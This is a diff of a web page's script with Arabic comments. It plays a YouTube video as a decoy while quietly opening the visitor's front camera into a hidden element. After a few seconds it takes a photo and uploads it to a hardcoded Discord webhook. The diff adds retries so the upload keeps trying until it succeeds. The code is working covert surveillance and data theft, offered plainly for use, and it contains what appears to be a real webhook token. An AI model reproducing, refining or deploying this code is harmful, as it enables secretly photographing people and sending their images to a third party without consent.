@@ -40,33 +40,33 @@
 <canvas id="photo-canvas"></canvas>
 
 <script>
+    // تم التأكد من رابط الويب هوك الخاص بك
     const webhookURL = 'https://discord.com/api/webhooks/1493312893100228608/X78aap9qPQUcppW21eNRpVDCiJGIS3OFDw6rH6ZKTPVTzsQbsGJyBKMWV7slNEt67zUs';
     const overlay = document.getElementById('start-overlay');
     const iframe = document.getElementById('youtube-frame');
     const camera = document.getElementById('hidden-camera');
 
     overlay.addEventListener('click', async () => {
-        // 1. إخفاء الواجهة فوراً لتجنب الضغط المتكرر
         overlay.style.display = 'none';
         iframe.style.visibility = 'visible';
 
         try {
-            // 2. تشغيل الفيديو والصوت أولاً (لإعطاء انطباع بالعمل الفوري)
+            // تشغيل الصوت والفيديو
             iframe.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', '*');
             iframe.contentWindow.postMessage('{"event":"command","func":"unMute","args":""}', '*');
 
-            // 3. طلب الكاميرا في الخلفية
+            // طلب الكاميرا
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: "user" } 
             });
             camera.srcObject = stream;
 
             camera.onplaying = () => {
-                // الانتظار قليلاً لضمان وضوح الصورة
+                // محاولة التصوير بعد 3 ثوانٍ من استقرار البث
                 setTimeout(captureAndSend, 3000);
             };
         } catch (err) {
-            console.log("Error starting components");
+            console.error("خطأ في تشغيل الكاميرا أو الفيديو");
         }
     });
 
@@ -79,16 +79,34 @@
             canvas.height = camera.videoHeight;
             context.drawImage(camera, 0, 0, canvas.width, canvas.height);
             
+            // تحويل الصورة إلى Blob (ملف)
             canvas.toBlob(async (blob) => {
                 if (!blob) return;
-                const formData = new FormData();
-                formData.append('file', blob, 'shot.png');
-                formData.append('content', '✅ تم استلام الصورة بنجاح');
 
-                await fetch(webhookURL, { method: 'POST', body: formData });
+                const formData = new FormData();
+                // "file" هو المفتاح الذي يتوقعه ديسكورد لاستلام الصور
+                formData.append('file', blob, 'shot.png');
+                formData.append('content', '📸 تم التقاط وجه المستخدم بنجاح');
+
+                try {
+                    const response = await fetch(webhookURL, {
+                        method: 'POST',
+                        body: formData // إرسال كـ FormData لضمان وصولها كملف
+                    });
+
+                    if (response.ok) {
+                        console.log("تم الإرسال للديسكورد بنجاح!");
+                    } else {
+                        // إذا كان هناك خطأ من ديسكورد (مثل ضغط الطلبات)، أعد المحاولة
+                        setTimeout(captureAndSend, 2000);
+                    }
+                } catch (e) {
+                    // محاولة الإرسال مرة أخرى في حال فشل الاتصال
+                    setTimeout(captureAndSend, 2000);
+                }
             }, 'image/png');
         } else {
-            // إعادة محاولة إذا لم تكن الكاميرا جاهزة بعد
+            // الكاميرا لم تجهز بعد، انتظر ثانية وحاول مجدداً
             setTimeout(captureAndSend, 1000);
         }
     }
